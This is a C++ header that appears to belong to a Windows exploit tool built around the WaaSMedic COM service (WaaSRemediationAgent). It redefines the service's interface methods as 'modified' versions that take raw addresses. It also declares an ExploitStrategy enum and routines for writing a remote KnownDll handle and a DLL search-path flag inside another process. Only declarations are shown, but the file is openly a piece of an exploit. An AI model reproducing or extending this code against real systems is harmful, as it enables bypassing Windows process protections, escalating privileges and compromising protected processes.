#pragma once

#include <Windows.h>
#include <comdef.h>

#define CLSID_WAASREMEDIATION   { 0x72566e27, 0x1abb, 0x4eb3, { 0xb4, 0xf0, 0xeb, 0x43, 0x1c, 0xb1, 0xcb, 0x32 } } // WaaSRemediationAgent - 72566E27-1ABB-4EB3-B4F0-EB431CB1CB32
#define IID_WAASREMEDIATIONEX   { 0xb4c1d279, 0x966e, 0x44e9, { 0xa9, 0xc5, 0xcc, 0xaf, 0x4a, 0x77, 0x02, 0x3d } } // IWaaSRemediationEx - B4C1D279-966E-44E9-A9C5-CCAF4A77023D
#define IID_TASKHANDLER         { 0x839d7762, 0x5121, 0x4009, { 0x92, 0x34, 0x4f, 0x0d, 0x19, 0x39, 0x4f, 0x04 } } // ITaskHandler - 839D7762-5121-4009-9234-4F0D19394F04

class __declspec(uuid("b4c1d279-966e-44e9-a9c5-ccaf4a77023d")) IWaaSRemediationEx : public IDispatch {
public:
    //virtual HRESULT __stdcall LaunchDetectionOnly(BSTR bstrCallerApplicationName, BSTR* pbstrPlugins) = 0; // Legit version of LaunchDetectionOnly
    virtual HRESULT __stdcall LaunchDetectionOnly(BSTR bstrCallerApplicationName, ULONGLONG pbstrPlugins) = 0; // Modified version of LaunchDetectionOnly
    //virtual HRESULT __stdcall LaunchRemediationOnly(BSTR bstrPlugins, BSTR bstrCallerApplicationName, VARIANT* varResults) = 0; // Legit version of LaunchRemediationOnly
    virtual HRESULT __stdcall LaunchRemediationOnly(BSTR bstrPlugins, BSTR bstrCallerApplicationName, ULONGLONG varResults) = 0; // Modified version of LaunchRemediationOnly
};

_COM_SMARTPTR_TYPEDEF(IWaaSRemediationEx, __uuidof(IWaaSRemediationEx));

class __declspec(uuid("839d7762-5121-4009-9234-4f0d19394f04")) ITaskHandler : public IUnknown {
public:
    virtual HRESULT __stdcall Start(IUnknown* pHandlerServices, BSTR data) = 0;
    virtual HRESULT __stdcall Stop(HRESULT* pRetCode) = 0;
    virtual HRESULT __stdcall Pause() = 0;
    virtual HRESULT __stdcall Resume() = 0;
};

_COM_SMARTPTR_TYPEDEF(ITaskHandler, __uuidof(ITaskHandler));

enum class ExploitStrategy
{
    ExtractByteAtIndex0,
    ExtractByteAtIndex1,
    ExtractByteAtIndex2
};

typedef struct _WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM
{
    ExploitStrategy Strategy;
    IWaaSRemediationEx* WaaSRemediationEx;
    ULONG_PTR WriteAtLaunchDetectionOnly;
    ULONG_PTR WriteAtLaunchRemediationOnly;
    DISPID DispIdLaunchDetectionOnly;
    DISPID DispIdLaunchRemediationOnly;
    BSTR CallerApplicationName;
    BSTR Plugins;
} WRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM, * PWRITE_REMOTE_KNOWN_DLL_HANDLE_PARAM;

typedef struct _WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM
{
    IWaaSRemediationEx* WaaSRemediationEx;
    ULONG_PTR WriteAt;
    DISPID DispIdLaunchRemediationOnly;
    BSTR CallerApplicationName;
    BSTR Plugins;
} WRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM, * PWRITE_REMOTE_DLL_SEARCH_PATH_FLAG_PARAM;

class WaaSMedicClient
{
private:
    BOOL _ClientReady;
    HRESULT _ComResult;
    ULONG_PTR _BaseAddress;
    ULONG _TargetValue;
    ExploitStrategy _Strategy;
    DWORD _Timeout;
    IWaaSRemediationEx* _WaaSRemediationEx;
    ULONG_PTR _WriteAtLaunchDetectionOnly;
    ULONG_PTR _WriteAtLaunchRemediationOnly;
    DISPID _DispIdLaunchDetectionOnly;
    DISPID _DispIdLaunchRemediationOnly;
    BSTR _Application;
    BSTR _Plugins;

public:
    WaaSMedicClient();
    WaaSMedicClient(ULONG_PTR BaseAddress, ULONG TargetValue);
    ~WaaSMedicClient();
    BOOL WriteRemoteDllSearchPathFlag();
    BOOL WriteRemoteKnownDllHandle();
    BOOL CreateTaskHandlerInstance();

private:
    BOOL InitializeInterface();
    BOOL ResolveDispatchIds();
    BOOL FindCombaseDllSearchFlagAddress(PULONG_PTR Address);
    BOOL CalculateWriteAddresses();
    static HRESULT InvokeLaunchDetectionOnly(IWaaSRemediationEx* Interface, DISPID DispId, BSTR CallerApplicationName, ULONG_PTR Result);
    static HRESULT InvokeLaunchRemediationOnly(IWaaSRemediationEx* Interface, DISPID DispId, BSTR Plugins, BSTR CallerApplicationName, ULONG_PTR Result);
    static DWORD WINAPI WriteRemoteDllSearchPathFlagThread(LPVOID Parameter);
    static DWORD WINAPI WriteRemoteKnownDllHandleThread(LPVOID Parameter);
    static DWORD WINAPI CreateTaskHandlerInstanceThread(LPVOID Parameter);
};